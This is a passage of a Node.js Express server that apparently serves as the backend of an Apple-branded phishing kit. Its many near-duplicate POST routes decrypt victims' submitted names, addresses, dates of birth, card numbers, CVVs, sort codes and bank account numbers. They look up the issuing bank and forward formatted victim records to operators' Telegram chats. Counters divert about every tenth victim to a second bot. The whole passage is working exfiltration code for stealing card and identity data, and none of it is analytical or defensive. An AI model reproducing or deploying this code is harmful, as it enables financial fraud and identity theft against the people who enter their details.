              text: `AppleSmoked:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-657196971",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/trizApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-712431616",
            text: `AppleTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Complete");
    });
});

app.post("/tcapzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (capzEvri == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleTcapz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1437456088,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        capzEvri += 1;
      }
      res.send("Update Complete");
    });
});

let fasterpayments = 0;

app.post("/fasterpaymApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fasterpayments == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5470125126,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fasterpayments += 1;
      }
      res.send("Update Complete");
    });
});

let blackTesco = 0;

app.post("/blacktescoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (blackTesco == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleBlackTesco:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5028651320,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        blackTesco += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/yardzApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (yardzCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5138777422,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        yardzCount += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/osbApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1248091713,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bill += 1;
      }
      res.send("Update Complete");
    });
});

let cya = 10;

app.post("/cyaApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-752137860",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

let heisenberg = 0;

app.post("/heisenbergApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (heisenberg == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleHeisenberg:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5009877290,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

let pablo = 0;

app.post("/pabloApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
